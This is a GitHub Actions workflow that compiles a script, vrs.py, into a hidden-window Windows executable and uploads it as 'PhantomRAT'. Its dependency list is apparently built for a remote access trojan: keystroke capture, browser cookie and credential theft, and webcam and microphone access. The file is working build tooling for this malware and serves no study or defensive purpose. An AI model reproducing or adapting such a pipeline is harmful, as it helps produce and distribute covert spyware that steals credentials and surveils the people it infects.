name: Build Windows EXE

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
    - uses: actions/checkout@v4

    - name: Setup Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.10'

    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install pyinstaller
        pip install pynput cryptography psutil pywin32 wmi opencv-python pillow pyaudio browser-cookie3 pycryptodome requests numpy

    - name: Build EXE
      run: |
        pyinstaller --onefile --noconsole --hidden-import=pynput --hidden-import=cryptography --hidden-import=psutil --hidden-import=win32gui --hidden-import=win32process --hidden-import=win32api --hidden-import=win32con --hidden-import=win32security --hidden-import=wmi --hidden-import=cv2 --hidden-import=PIL --hidden-import=pyaudio --hidden-import=browser_cookie3 --hidden-import=win32crypt --hidden-import=Crypto vrs.py

    - name: Upload EXE
      uses: actions/upload-artifact@v4
      with:
        name: PhantomRAT
        path: dist/vrs.exe
